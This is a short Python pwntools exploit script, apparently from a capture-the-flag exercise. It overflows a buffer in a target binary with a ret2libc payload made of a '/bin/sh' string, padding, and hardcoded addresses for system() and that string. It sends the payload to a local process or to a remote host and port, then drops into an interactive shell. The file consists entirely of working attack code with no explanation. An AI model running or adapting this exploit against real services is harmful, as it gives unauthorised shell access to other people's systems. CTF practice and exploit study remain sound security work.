#!/usr/bin/env python2

from pwn import *
import sys

env = ""
binary = ""

ip = None
port = None

b = None
p = None

loot = {
}

def exploit():
    global b, p, settings

    load_env()

    payload = "/bin/sh\x00"
    payload += "\x00" * 0x94
    payload += p32(0xf7e31840) # system addr
    payload += p32(0x0)
    payload += p32(0x804a060) # /bin/sh addr

    p.clean()

    p.sendline(payload)

    p.interactive()

def load_env():
    global b, p

    b = ELF(binary)

    if env == "local":
        p = process([binary])
        log.info(util.proc.pidof(p))
        pause()

    elif env == "remote":
        p = remote(ip, port)


def usage():
    print "Usage: ./%s [binary] [local|remote] <ip> <port>" % sys.argv[0]


if __name__ == '__main__':
    args = sys.argv

    if len(args) < 3:
        usage()
        exit()

    binary = sys.argv[1]
    env = sys.argv[2]

    if env == "remote":
        if len(args) != 5:
            usage()
            exit()
        else:
            ip = sys.argv[3]
            port = int(sys.argv[4])

    exploit()
